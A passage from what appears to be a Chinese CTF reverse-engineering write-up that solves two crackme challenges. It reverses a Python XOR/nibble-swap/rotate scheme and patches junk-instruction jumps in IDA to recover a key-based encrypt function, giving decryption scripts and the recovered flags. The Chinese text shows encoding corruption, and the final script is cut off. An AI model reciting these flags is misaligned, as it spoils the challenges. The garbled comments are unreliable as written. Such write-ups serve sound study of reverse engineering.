</span></span><span class="line"><span class="cl">    <span class="mi">98</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">54</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">str_to_hex_bytes</span><span class="p">(</span><span class="n">s</span> <span class="o">=</span> <span class="n">None</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="err">&#39;</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">data</span> <span class="o">=</span> <span class="n">None</span><span class="p">,</span> <span class="n">key</span> <span class="o">=</span> <span class="n">None</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">None</span><span class="p">((</span><span class="n">lambda</span> <span class="mf">.0</span> <span class="o">=</span> <span class="nl">None</span><span class="p">:</span> <span class="p">[</span> <span class="n">b</span> <span class="o">^</span> <span class="n">key</span> <span class="k">for</span> <span class="n">b</span> <span class="n">in</span> <span class="mf">.0</span> <span class="p">])(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">en3</span><span class="p">(</span><span class="n">b</span> <span class="o">=</span> <span class="n">None</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">240</span> <span class="o">|</span> <span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">15</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">en33</span><span class="p">(</span><span class="n">data</span> <span class="o">=</span> <span class="n">None</span><span class="p">,</span> <span class="n">n</span> <span class="o">=</span> <span class="n">None</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">&#39;&#39;&#39;æ•´ä½“</span> <span class="n">bitstream</span> <span class="err">å¾ªç¯å·¦ç§»</span> <span class="n">n</span> <span class="err">ä½&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_len</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="n">bit_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="kt">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">big</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">n</span> <span class="o">|</span> <span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="n">bit_len</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_len</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="err">&#39;</span><span class="n">big</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="err">&#39;</span><span class="n">__main__</span><span class="err">&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="err">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nf">str_to_hex_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nf">enc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">((</span><span class="n">lambda</span> <span class="mf">.0</span><span class="o">:</span> <span class="p">[</span> <span class="nf">en3</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="n">in</span> <span class="mf">.0</span> <span class="p">])(</span><span class="n">data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="o">::-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nf">en33</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span> <span class="o">==</span> <span class="nl">cipher</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Correct</span><span class="o">!</span> <span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">print</span><span class="p">(</span><span class="err">&#39;</span><span class="n">Wrong</span><span class="err">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>è¯¥ä»£ç è™½ç„¶æ— æ³•ç¼–è¯‘ä½†æ˜¯å¯ä»¥çœ‹çš„å‡ºæ˜¯å¦‚ä½•åŠ å¯†çš„ï¼Œç„¶åå†æ ¹æ®åŠ å¯†è¿‡ç¨‹åæ¨å‡ºè§£å¯†è¿‡ç¨‹</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">en3</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">240</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">def</span> <span class="nf">de33</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_len</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">bit_len</span> <span class="o">==</span> <span class="mi">0</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">b</span><span class="s">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="n">bit_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="kt">int</span><span class="p">.</span><span class="nf">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="err">&#39;</span><span class="n">big</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="n">n</span> <span class="o">|</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">bit_len</span> <span class="o">-</span> <span class="n">n</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_len</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span><span class="p">.</span><span class="nf">to_bytes</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="err">&#39;</span><span class="n">big</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">57</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mi">48</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">55</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mi">50</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">54</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">50</span><span class="p">,</span><span class="mi">54</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 1: è½¬ä¸º hex å­—ç¬¦ä¸²
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">hex_str</span> <span class="o">=</span> <span class="err">&#39;&#39;</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="n">in</span> <span class="n">cipher</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">print</span><span class="p">(</span><span class="s">&#34;Expected hex:&#34;</span><span class="p">,</span> <span class="n">hex_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 2: è§£æä¸ºäºŒè¿›åˆ¶æ•°æ®ï¼ˆen33 è¾“å‡ºï¼‰
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">enc_data</span> <span class="o">=</span> <span class="n">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 3: é€†å‘ en33(data, 32)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">reversed_bytes</span> <span class="o">=</span> <span class="nf">de33</span><span class="p">(</span><span class="n">enc_data</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 4: é€†å‘ [::-1]
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">after_swap_nibble</span> <span class="o">=</span> <span class="n">reversed_bytes</span><span class="p">[</span><span class="o">::-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 5: é€†å‘ en3 (nibble swap)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">after_xor</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="nf">en3</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="n">in</span> <span class="n">after_swap_nibble</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 6: é€†å‘ XOR 17
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">flag_bytes</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="mi">17</span> <span class="k">for</span> <span class="n">b</span> <span class="n">in</span> <span class="n">after_xor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp"># Step 7: è¾“å‡º flag
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="n">flag</span> <span class="o">=</span> <span class="n">flag_bytes</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="err">&#39;</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span><span class="err">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>å¾—åˆ°flagï¼šSYC{jtfgdsfda554_a54d8as53}</p>
</li>
</ul>
<h3 id="3only_flower">3.only_flower
</h3><ul>
<li>
<p>æ‰“å¼€idaå‘ç°<code>  JUMPOUT(0x401620);</code></p>
</li>
<li>
<p>è¿›ä¸€æ­¥æŸ¥çœ‹å‘ç°ï¼Œè¯¥å¤„å­˜åœ¨<code> jmp     short near ptr loc_40161F+1</code>ä¸€æ¡èŠ±æŒ‡ä»¤ï¼Œå› ä¸ºè¿™ä¸ª+1ä¸ªå­—èŠ‚æ˜¯è·³è½¬åˆ°äº†æŒ‡ä»¤ä¸­é—´ï¼Œæ²¡æœ‰æ­£ç¡®çš„è·³è½¬åˆ°ä¸€ä¸ªæŒ‡ä»¤çš„å¼€å§‹ï¼Œä¼šå¯¼è‡´åç¼–è¯‘å‡ºé”™</p>
</li>
<li>
<p>è§£å†³åŠæ³•ï¼Œå°†è¯¥æŒ‡ä»¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ”¹ä¸º90ï¼Œå³å°†è¯¥æŒ‡ä»¤æ”¹ä¸ºnop</p>
</li>
<li>
<p>å¯¹äºè¯¥é¢˜ç›®ï¼Œå¯ä»¥é€‰æ‹©ç›´æ¥ä¸çœ‹ä¸»å‡½æ•°ï¼ŒèµŒåŠ å¯†è¿‡ç¨‹å…¨åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼ˆæ­£å¸¸æ¥è¯´å¯¹äºä¸»å‡½æ•°ä¹Ÿè¦ä¿®å¤ï¼‰</p>
</li>
<li>
<p>æŸ¥çœ‹stringè¡¨ï¼Œå‘ç°é™¤äº†è¾“å‡ºçš„æç¤ºï¼Œå‰©ä¸‹ä¸€ä¸ªGEEK2025çš„å¯ç–‘å­—ç¬¦ä¸²ï¼ŒåŒå‡»æŸ¥çœ‹ï¼Œåœ¨äº¤å‰å¼•ç”¨ï¼Œå‘ç°<code>.data:00404004 _KEY            dd offset aGeek2025     ; DATA XREF: _encrypt+6â†‘r</code>å¾—åˆ°å†å­—ç¬¦ä¸²å­˜åœ¨KEYæ•°ç»„å†…ï¼Œåœ¨å¯¹KEYä½¿ç”¨äº¤å‰å¼•ç”¨ï¼Œå‘ç°å†ä¸€ä¸ªencryptä½¿ç”¨äº†ï¼Œåˆç†çŒœæµ‹è¯¥å‡½æ•°å°±ä¸ºåŠ å¯†å‡½æ•°äº†ã€‚è¿›å…¥å‘ç°</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">encrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strlen</span><span class="p">(</span><span class="n">KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMPOUT</span><span class="p">(</span><span class="mh">0x4014C8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»è¿™é‡Œå¯ä»¥å‘ç°é€šè¿‡è¯¥ç§å‘ç°æ‰¾åˆ°åŠ å¯†å‡½æ•°å±äºç‰¹ä¾‹ï¼Œå› ä¸ºåˆšå¥½å†idaå¯ä»¥ç¼–è¯‘çš„èŒƒå›´å†…ä½¿ç”¨è¿‡KEYï¼Œå¦‚æœå‡ºé¢˜è€…æœ‰æ„åˆ™å¯ä»¥è®©åšé¢˜äººæ— æ³•é€šè¿‡è¯¥ç§æ–¹æ³•æ‰¾åˆ°åŠ å¯†å‡½æ•°ã€‚åœ¨é€šè¿‡äº¤å‰å¼•ç”¨æŸ¥æ‰¾å‡½æ•°æ—¶ï¼Œå¯ä»¥å‘ç°åœ¨GEEK2025ä¸‹æ–¹è¿˜æœ‰ä¸€ä¸ªæ•°ç»„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.rdata:00405070 _CIPHER         db 0Ah, 84h, 0C2h, 84h, 51h, 48h, 5Fh, 0F2h, 9Eh, 8Dh
</span></span><span class="line"><span class="cl">.rdata:0040507A                 db 0D0h, 84h, 75h, 67h, 73h, 8Fh, 0CAh, 57h, 0D7h, 0E6h
</span></span><span class="line"><span class="cl">.rdata:00405084                 db 14h, 6Eh, 77h, 0E2h, 29h, 0FEh, 0DFh, 0CCh
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯çŒœæµ‹å¤§æ¦‚ç‡è¯¥æ•°ç»„å­˜æ”¾çš„æ—¶å¯†æ–‡ï¼Œå¯¹è¯¥æ•°ç»„ä½¿ç”¨äº¤å‰å¼•ç”¨åˆ™æ— æ³•æ‰¾åˆ°åŠ å¯†å‡½æ•°</p>
<ul>
<li>ä¿®å¤åŠ å¯†å‡½æ•°ï¼šè¿™é‡Œå¯ä»¥å°†æ‰€ä»¥èŠ±æŒ‡ä»¤æ”¹ä¸ºnopï¼Œå°±å¯ä»¥å®Œæˆè¯¥å‡½æ•°çš„ä¿®å¤ï¼Œå¾—åˆ°</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">encrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">klen</span><span class="p">;</span> <span class="c1">// [esp+18h] [ebp-10h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">klen</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="nf">rol8</span><span class="p">(</span><span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">klen</span><span class="p">]</span> <span class="o">^</span> <span class="n">in</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">KEY</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">klen</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°åŠ å¯†å‡½æ•°ä¹‹åï¼Œå°±å¯ä»¥å†™å‡ºè§£å¯†è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// å¾ªç¯å³ç§»8ä½
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint8_t</span> <span class="nf">ror8</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="n">value</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">shift</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">shift</span> <span class="o">&amp;=</span> <span class="mi">7</span><span class="p">;</span>  <span class="c1">// ç¡®ä¿ç§»ä½åœ¨0-7èŒƒå›´å†…
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="p">(</span><span class="n">value</span> <span class="o">&gt;&gt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">value</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">decrypt</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">KEY</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">key_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">KEY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// æ­¥éª¤1: é€†å‘ç´¢å¼•åŠ æ³•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint8_t</span> <span class="n">temp1</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
